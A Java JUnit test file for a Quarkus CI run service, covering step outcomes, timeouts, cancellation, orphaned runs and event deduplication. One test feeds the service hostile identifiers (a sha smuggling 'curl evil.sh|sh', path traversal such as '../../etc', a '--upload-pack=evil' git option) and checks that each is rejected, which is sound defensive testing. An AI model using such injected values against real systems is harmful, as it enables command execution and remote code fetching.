package eu.wohlben.qits.ci.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.control.CiConfigSource.CommitHeld;
import eu.wohlben.qits.ci.control.CiStepRunner.StepOutcome;
import eu.wohlben.qits.ci.control.CiStepRunner.StepResult;
import eu.wohlben.qits.ci.entity.CiRun;
import eu.wohlben.qits.ci.entity.CiRunStatus;
import eu.wohlben.qits.ci.entity.CiStep;
import eu.wohlben.qits.ci.entity.CiStepStatus;
import eu.wohlben.qits.ci.entity.CiTriggerType;
import eu.wohlben.qits.ci.error.BadRequestException;
import eu.wohlben.qits.ci.error.ConflictException;
import eu.wohlben.qits.ci.error.NotFoundException;
import io.quarkus.narayana.jta.QuarkusTransaction;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import java.time.Instant;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.Test;

/**
 * Drives the orchestrator synchronously (package-private {@code executeEventRun}, through {@code
 * CiTestSupport.executePipeline}) against the scripted-event step runner — the whole run/step state
 * machine with no docker, no container and no git host.
 *
 * <p><b>It used to drive pushes, and that is the whole of what changed on 2026-09-05.</b> The entry
 * was {@code execute(repoId, branch, sha)}: accept a push and run it. Nothing here was ever about
 * pushes — it is the step loop, the failure vocabulary, the branch filter, the cancellation
 * semantics — so with the push arm retired every case drives the same machinery through the one
 * trigger type there is. What left with the push path left this file too: the config read on the run
 * worker and its four outcomes (ABSENT, GONE, UNREACHABLE, INVALID plus the parse), because a
 * trigger file is read and parsed before a row exists now, so a broken or missing one is a WARN in
 * {@code CiEventTriggerService} and never a row here.
 */
@QuarkusTest
public class CiRunServiceTest extends CiTestSupport {

  private static final String CONFIG_TWO_STEPS =
      """
      steps:
        - image: alpine:3
          script: echo one
        - image: alpine:3
          script: echo two
      """;

  @Inject CiRunService service;

  /** The green-run port, for the one case that has to prove an all-skipped run is really green. */
  @Inject FakeRunAnnouncer announcer;

  private String repoId;
  private String sha;
  private String pipeline;

  @org.junit.jupiter.api.BeforeEach
  void resetPorts() {
    announcer.reset();
  }

  /** A fresh repository and commit, and the pipeline the next {@link #run}/{@link #accept} declares. */
  private void seedConfig(String content) {
    repoId = UUID.randomUUID().toString();
    sha = UUID.randomUUID().toString().replace("-", "");
    pipeline = content;
  }

  /** Accept and run the seeded pipeline on one branch, synchronously — no worker timing to wait out. */
  private void run(String branch) {
    executePipeline(repoId, branch, sha, pipeline);
  }

  /**
   * The same, <b>asynchronously</b>: the row is written and the worker picks it up, which is the only
   * way to stage a state that exists while a run is in flight (a cancellation arriving mid-step).
   */
  private void accept(String branch) {
    service.onEventTrigger(eventRun(repoId, branch, sha, pipeline));
  }

  private CiRun soleRun() {
    List<CiRun> all = service.runsFor(repoId);
    assertEquals(1, all.size(), "expected exactly one recorded run");
    return all.get(0);
  }

  @Test
  public void greenRunRecordsSuccessWithStepOutputs() {
    seedConfig(CONFIG_TWO_STEPS);
    run("main");

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals("main", run.branch);
    assertEquals(sha, run.commitSha);
    assertNotNull(run.finishedAt);
    // The run is pinned to one daemon build, resolved once before any step launched.
    assertEquals("fake-daemon", run.daemonVersion);

    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size());
    for (CiStep step : recorded) {
      assertEquals(CiStepStatus.SUCCESS, step.status);
      assertEquals(0, step.exitCode);
      assertEquals("ok step " + step.stepIndex, step.output);
      assertEquals("alpine:3", step.image);
      // Host-stamped at the two points the host knows about first-hand, and in that order.
      assertNotNull(step.startedAt, "a step that ran must carry a started_at");
      assertNotNull(step.finishedAt, "a step that ran must carry a finished_at");
      assertFalse(step.finishedAt.isBefore(step.startedAt));
    }
    // The runner saw the right specs, in order, each carrying the run's pinned binary url.
    assertEquals(2, fakeRunner.executed().size());
    assertEquals("echo one", fakeRunner.executed().get(0).script());
    assertEquals(sha, fakeRunner.executed().get(0).sha());
    assertEquals("main", fakeRunner.executed().get(0).branch());
    assertEquals(
        "http://fake.invalid/ci-daemon/fake-daemon", fakeRunner.executed().get(0).daemonBinaryUrl());
    // Chunks reached the listener while the step ran — the seam's event half.
    assertEquals(List.of("ok step 0", "ok step 1"), fakeRunner.emitted());
    // And the run released whatever the runner was holding for it.
    assertEquals(List.of(run.id), fakeRunner.closed());
  }

  @Test
  public void failingStepFailsTheRunAndSkipsTheRest() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(7, false, StepOutcome.OK, "boom"));
    run("main");

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertEquals(7, recorded.get(0).exitCode);
    assertEquals("boom", recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertNull(recorded.get(1).exitCode);
    // A skipped step never started, so it carries neither timestamp.
    assertNull(recorded.get(1).startedAt);
    assertNull(recorded.get(1).finishedAt);
    // Only the failing step actually executed.
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void timedOutStepEndsTheRunTimedOutWithAMarkedOutput() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "partial output"));
    run("main");

    CiRun run = soleRun();
    // A deadline is not a pipeline verdict, so neither the step nor the run is FAILED.
    assertEquals(CiRunStatus.TIMED_OUT, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    CiStep first = recorded.get(0);
    assertEquals(CiStepStatus.TIMED_OUT, first.status);
    // Recorded as a timeout, not as a script that happened to exit 143.
    assertTrue(first.output.contains("[step timed out]"), first.output);
    assertTrue(first.output.contains("partial output"), first.output);
    assertEquals(143, first.exitCode);
    // And it stops the run exactly as a failure does.
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void aCancelledStepThatAlsoTimedOutIsRecordedCancelled() throws Exception {
    // Both flags can be true: the host aborts a cancelled container the same way it aborts one that
    // ran out of time, so the terminal frame can carry timedOut. A cancellation is a user decision,
    // so it wins over the clock — neither the step nor the run may read TIMED_OUT. Staged like the
    // cancellation test above, because that is the only way the flag is really set.
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStepZero = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStepZero.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    fakeRunner.script(0, new StepResult(143, true, StepOutcome.OK, "half a line"));

    accept("main");
    String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
    service.cancel(runId);
    cancelled.countDown();
    service.awaitIdle();

    forgetLoadedEntities();
    CiRun run = soleRun();
    assertEquals(CiRunStatus.CANCELLED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    assertTrue(first.output.contains("cancelled"), first.output);
  }

  @Test
  public void aDeclaredPerStepTimeoutOverridesTheDeploymentDefault() {
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: echo quick
            timeout-seconds: 30
          - image: alpine:3
            script: echo slow
        """);
    run("main");

    assertEquals(30, fakeRunner.executed().get(0).timeoutSeconds());
    // An absent field means the shipped default: 30 minutes.
    assertEquals(1800, fakeRunner.executed().get(1).timeoutSeconds());
  }

  @Test
  public void aDeclaredDockerFlagTravelsFromTheYamlToTheStepItWasDeclaredOn() {
    // The seam-level half of the docker-socket feature: everything from the parsed key to the argv is
    // covered elsewhere, and what this asserts is the wiring in between — that the flag arrives at the
    // runner attached to the step that declared it and to no other. The mount itself is
    // CiDaemonLauncherTest's subject; that a step which declared nothing keeps its sandbox is asserted
    // there as an absence, and here as a plain false.
    seedConfig(
        """
        steps:
          - image: alpine:3
            script: ./mvnw -B -ntp verify
          - image: alpine:3
            docker: true
            script: |
              docker build -t "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA" .
              docker push "$QITS_REGISTRY/$QITS_IMAGE_REPOSITORY/app:$QITS_CI_SHA"
        """);
    run("main");

    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
    assertEquals(2, fakeRunner.executed().size());
    assertFalse(fakeRunner.executed().get(0).docker(), "a step declaring nothing asks for no socket");
    assertTrue(fakeRunner.executed().get(1).docker(), "the publish step's declaration must arrive");
    // And a publish step is an ordinary step in every other respect — same image handling, same
    // recorded row, same deployment-default deadline unless it said otherwise.
    assertEquals(1800, fakeRunner.executed().get(1).timeoutSeconds());
    assertEquals(CiStepStatus.SUCCESS, service.stepsFor(soleRun().id).get(1).status);
  }

  // The per-step branch filter used to live here — five cases about `branches:` on a step, the
  // note a branch-skipped row carried, and a run whose every step was skipped still finishing green.
  // The key was a `ci-post-receive.yml` feature and was always a parse error in a trigger file (an
  // event run's branch is the trigger's single decision, so a per-step filter over it is inert or
  // unreachable), so it went with per-push CI on 2026-09-05 along with CiPipeline.BranchFilter and
  // the SKIPPED-by-branch arm in runSteps. That the key is still REFUSED, loudly, is
  // CiEventTriggerParserTest's.

  @Test
  public void aPipelineWithNoStepsRecordsATriviallyGreenRun() {
    // A trigger file that matched but declares nothing to verify. Recorded, and green: the run says
    // something true about the commit, which is that this pipeline had no objection to it.
    seedConfig("# no steps yet\n");
    run("main");

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(0, service.stepsFor(run.id).size());
  }

  @Test
  public void aShaGoneCheckoutDiscardsTheRunWhenTheCommitIsIndeedGone() {
    // The daemon's checkout is the probe: it reports SHA_GONE, and commitHeld confirms the commit
    // was force-pushed away after the run was accepted. The run describes work on a commit that no
    // longer exists.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.putCommit(repoId, sha, CommitHeld.GONE);
    fakeRunner.script(
        0,
        new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: reference is not a tree: deadbeef"));
    run("main");
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void aShaGoneCheckoutOnAReachableCommitStaysOnTheRecord() {
    // Same frame, different truth: the commit is still there, so something else broke the checkout
    // and the user must see it. Discarding here would hide a broken pipeline.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(
        0, new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: could not read from remote"));
    run("main");

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("could not read from remote"));
    assertTrue(recorded.get(0).output.contains("could not check out"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void aShaGoneCheckoutOnAnUnreachableGitHostStaysOnTheRecord() {
    // The third answer, and the one a boolean would have lost: the host could not be asked, so it
    // has said nothing about the commit. UNKNOWN must not read as GONE — discarding here would erase
    // a verdict on evidence nobody has, which is the "a read failure must not invent a gate" rule
    // pointed the other way.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.putCommit(repoId, sha, CommitHeld.UNKNOWN);
    fakeRunner.script(
        0, new StepResult(-1, false, StepOutcome.SHA_GONE, "fatal: reference is not a tree"));
    run("main");

    assertEquals(CiRunStatus.FAILED, soleRun().status, "an unanswered probe keeps the row");
  }

  @Test
  public void anInitFailureWithNoReasonIsRecordedGenericallyAndNeverDiscardsTheRun() {
    // A hostile daemon can send InitFailed with an absent reason — the codec decodes that to null
    // rather than throwing, deliberately. It has to land as a generic setup failure and must NOT
    // fall through the SHA_GONE branch, which would let a container delete the run watching it.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.putCommit(repoId, sha, CommitHeld.GONE); // the probe would say "discard" if reached
    fakeRunner.script(0, new StepResult(-1, false, StepOutcome.INIT_FAILED, "(no reason given)"));
    run("main");

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    assertTrue(first.output.contains("could not prepare its workspace"), first.output);
  }

  @Test
  public void eachDistinguishableFailureStateIsRecordedAsItself() {
    // The transferred failure-state rule: docker refusing the launch, a container that never started
    // a daemon, one that registered and never finished a checkout, and a socket lost mid-step are
    // four different things, and none of them is "the step failed with exit -1".
    for (StepOutcome outcome :
        List.of(
            StepOutcome.LAUNCH_FAILED,
            StepOutcome.NEVER_STARTED,
            StepOutcome.NEVER_INITIALIZED,
            StepOutcome.CONNECTION_LOST)) {
      resetCiState();
      seedConfig(CONFIG_TWO_STEPS);
      fakeRunner.script(0, new StepResult(-1, false, outcome, "diagnosis for " + outcome));
      run("main");

      CiStep first = service.stepsFor(soleRun().id).get(0);
      assertEquals(CiStepStatus.FAILED, first.status, outcome.name());
      assertTrue(first.output.contains("diagnosis for " + outcome), first.output);
      assertEquals(
          expectedNote(outcome),
          first.output.substring(first.output.lastIndexOf('[')),
          "each state must record a message that is only its own");
    }
  }

  private static String expectedNote(StepOutcome outcome) {
    return switch (outcome) {
      case LAUNCH_FAILED -> "[the step container could not be started]";
      case NEVER_STARTED -> "[the step container never started its ci daemon]";
      case NEVER_INITIALIZED -> "[the step container never reported its checkout done]";
      case CONNECTION_LOST -> "[the connection to the step container was lost]";
      default -> throw new IllegalArgumentException(outcome.name());
    };
  }

  @Test
  public void aFailureMidRunRecordsTheStepItHappenedOnAndSkipsTheRest() {
    // A crash inside the runner must not make a declared step vanish from the run: nothing is
    // written upfront any more, so the exception path is what has to write those rows.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.throwOn(0, new IllegalStateException("transient failure"));
    run("main");

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    assertNotNull(run.finishedAt);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size(), "every declared step must still have a row");
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("transient failure"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void aCancellationMidStepCancelsTheRunFailsThatStepAndSkipsTheRest() throws Exception {
    // Staged the way it really happens: the run is on the worker, step 0 is executing, and the
    // cancellation arrives from another thread — the HTTP one. The fake holds step 0 open until the
    // POST has landed, so there is no sleep and no race about when "mid-step" is.
    //
    // Note the step still FINISHES normally afterwards — a daemon answers a Cancel with a terminal
    // frame — so cancelledness has to be read from the flag, never inferred from how run() returned.
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStepZero = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStepZero.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    fakeRunner.script(0, new StepResult(137, false, StepOutcome.OK, "half a line"));

    accept("main");
    String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
    service.cancel(runId);
    cancelled.countDown();
    service.awaitIdle();

    // The cancel above read the run into this thread's persistence context while it was still
    // RUNNING; without this the assertions below would read that copy back rather than the worker's.
    forgetLoadedEntities();
    CiRun run = soleRun();
    assertEquals(CiRunStatus.CANCELLED, run.status);
    assertNotNull(run.startedAt);
    assertEquals(CiRunService.USER_CANCELLED, run.cancellationReason);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertTrue(recorded.get(0).output.contains("cancelled"), recorded.get(0).output);
    assertTrue(recorded.get(0).output.contains("half a line"), recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    // The runner was actually asked to stop the container, not just flagged.
    assertEquals(List.of(run.id), fakeRunner.cancelled());
    assertEquals(1, fakeRunner.executed().size(), "step 1 must never have been launched");
  }

  @Test
  public void manualCancellationPersistsTheOptionalReason() throws Exception {
    seedConfig(CONFIG_TWO_STEPS);
    CompletableFuture<String> reachedStep = new CompletableFuture<>();
    CountDownLatch cancelled = new CountDownLatch(1);
    fakeRunner.during(
        0,
        spec -> {
          reachedStep.complete(spec.runId());
          try {
            cancelled.await(10, TimeUnit.SECONDS);
          } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
          }
        });
    accept("main");
    String runId = reachedStep.get(10, TimeUnit.SECONDS);
    service.cancel(runId, "No longer needed");
    cancelled.countDown();
    service.awaitIdle();
    forgetLoadedEntities();

    assertEquals("No longer needed", soleRun().cancellationReason);
  }

  @Test
  public void cancellingARunningRunNoWorkerOwnsSettlesItCancelledAndFailsItsIncompleteSteps() {
    // What a dead predecessor leaves behind. On 2026-08-23 a start-first successor swept, and the
    // dying process then claimed a queued row and died holding it RUNNING — a row past every sweep,
    // executed by nobody. Cancel used to record a reason on it and ask a runner that owns nothing to
    // stop, so the row stayed RUNNING and had to be flipped by hand in SQL.
    seedConfig(CONFIG_TWO_STEPS);
    String runId = seedOrphanedRunningRun();

    service.cancel(runId, "the process that was running it is gone");

    forgetLoadedEntities();
    CiRun settled = soleRun();
    assertEquals(CiRunStatus.CANCELLED, settled.status);
    assertNotNull(settled.finishedAt, "an unowned run is finished here, not left for a worker");
    assertEquals("the process that was running it is gone", settled.cancellationReason);
    assertNull(settled.supersededByRunId);
    List<CiStep> recorded = service.stepsFor(runId);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status, "its in-flight step died with it");
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    // And nothing was asked to stop, because there is nothing here to ask.
    assertEquals(List.of(), fakeRunner.cancelled());
  }

  @Test
  public void cancellingAnUnownedRunTwiceIsAConflictTheSecondTime() {
    // The settle is terminal like every other cancellation, so it closes the row rather than leaving
    // a door a retry keeps walking through.
    seedConfig(CONFIG_TWO_STEPS);
    String runId = seedOrphanedRunningRun();

    service.cancel(runId);

    assertEquals(CiRunService.USER_CANCELLED, soleRun().cancellationReason);
    assertThrows(ConflictException.class, () -> service.cancel(runId));
  }

  /**
   * A {@code RUNNING} row with one running and one pending step, and no worker anywhere behind it —
   * exactly what a process killed mid-step leaves for its successor.
   */
  private String seedOrphanedRunningRun() {
    String runId = UUID.randomUUID().toString();
    QuarkusTransaction.requiringNew()
        .run(
            () -> {
              CiRun run = new CiRun();
              run.id = runId;
              run.repoId = repoId;
              run.branch = "main";
              run.commitSha = sha;
              run.status = CiRunStatus.RUNNING;
              run.triggerType = CiTriggerType.EVENT;
              run.configPath = TEST_TRIGGER_PATH;
              run.createdAt = Instant.now();
              run.startedAt = Instant.now();
              runs.persist(run);
              steps.persist(orphanedStep(runId, 0, CiStepStatus.RUNNING));
              steps.persist(orphanedStep(runId, 1, CiStepStatus.PENDING));
            });
    return runId;
  }

  private static CiStep orphanedStep(String runId, int index, CiStepStatus status) {
    CiStep step = new CiStep();
    step.id = UUID.randomUUID().toString();
    step.runId = runId;
    step.stepIndex = index;
    step.image = "alpine:3";
    step.status = status;
    return step;
  }

  @Test
  public void cancellingAFinishedRunIsAConflictAndAnUnknownRunIsANotFound() {
    seedConfig(CONFIG_TWO_STEPS);
    run("main");
    String runId = soleRun().id;

    assertThrows(ConflictException.class, () -> service.cancel(runId));
    assertThrows(NotFoundException.class, () -> service.cancel("no-such-run"));
    // A refused cancellation must not have reached the runner at all.
    assertEquals(List.of(), fakeRunner.cancelled());
  }

  @Test
  public void hostileIdentifiersAreRejectedAtTheEntryPoint() {
    // An event payload says what somebody else's service said, and a checkout trigger reads the
    // branch and sha straight out of it — so the ids are validated at the accept, before they reach
    // a filesystem path or an argv. This is the same guard the retired push intake carried, on the
    // one entry that is left.
    String good = UUID.randomUUID().toString();
    assertThrows(
        BadRequestException.class,
        () -> service.onEventTrigger(eventRun(good, "main", "HEAD\nset +e\ncurl evil.sh|sh #", CONFIG_TWO_STEPS)));
    assertThrows(
        BadRequestException.class,
        () -> service.onEventTrigger(eventRun("../../etc", "main", "cafebabe0000000", CONFIG_TWO_STEPS)));
    assertThrows(
        BadRequestException.class,
        () ->
            service.onEventTrigger(
                eventRun(good, "--upload-pack=evil", "cafebabe0000000", CONFIG_TWO_STEPS)));
    // The name half is checked too — but ONLY when it is there, which is the whole compatibility
    // arm: a candidate the catalogue could name nothing for carries no pair and must still be
    // accepted (every other case in this method passes one with no names at all).
    assertThrows(
        BadRequestException.class,
        () ->
            service.onEventTrigger(
                eventRun(
                    CiRepoRef.of(good, "../../etc", "qits-ci"),
                    "main",
                    "cafebabe0000000",
                    CONFIG_TWO_STEPS)));
    assertThrows(
        BadRequestException.class,
        () ->
            service.onEventTrigger(
                eventRun(
                    CiRepoRef.of(good, "qits", "../evil"),
                    "main",
                    "cafebabe0000000",
                    CONFIG_TWO_STEPS)));
  }

  @Test
  public void theAcceptExecutesAsynchronously() throws Exception {
    seedConfig(CONFIG_TWO_STEPS);
    accept("main");
    service.awaitIdle();
    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
  }

  @Test
  public void theTriggeringEventLandsOnTheRunSoTheAnnouncementCanBeCausedByIt() throws Exception {
    // CausingEvent turns this column into the published BuildSuccessful's parentId, on another
    // thread and possibly after a restart — so the row is the whole hand-off, and this is where it
    // is written. What the publish does with it is asserted in CiEventTriggerCausationTest.
    seedConfig(CONFIG_TWO_STEPS);
    CiRunService.EventRun request = eventRun(repoId, "main", sha, pipeline);
    service.onEventTrigger(request);
    service.awaitIdle();

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(request.eventId(), run.triggerEventId);
    assertEquals(CiTriggerType.EVENT, run.triggerType);
  }

  @Test
  public void oneAnnouncedEventIsOneRun() throws Exception {
    // The unique constraint on (trigger_event_id, repo_id, config_path). The duplicate is SETTLED
    // rather than thrown: a second delivery must not leave the event owed forever over a run that
    // already exists.
    seedConfig(CONFIG_TWO_STEPS);
    CiRunService.EventRun request = eventRun(repoId, "main", sha, pipeline);
    service.onEventTrigger(request);
    service.onEventTrigger(request);
    service.awaitIdle();

    assertEquals(1, service.runsFor(repoId).size(), "one announcement, one run");
  }

  @Test
  public void tailKeepsTheEndAndMarksTheCut() {
    assertNull(CiRunService.tail(null, 10));
    assertEquals("short", CiRunService.tail("short", 10));
    assertEquals("exactlyten", CiRunService.tail("exactlyten", 10));
    String cut = CiRunService.tail("0123456789abcdef", 10);
    assertEquals(CiRunService.TRUNCATION_MARKER + "6789abcdef", cut);
  }
}
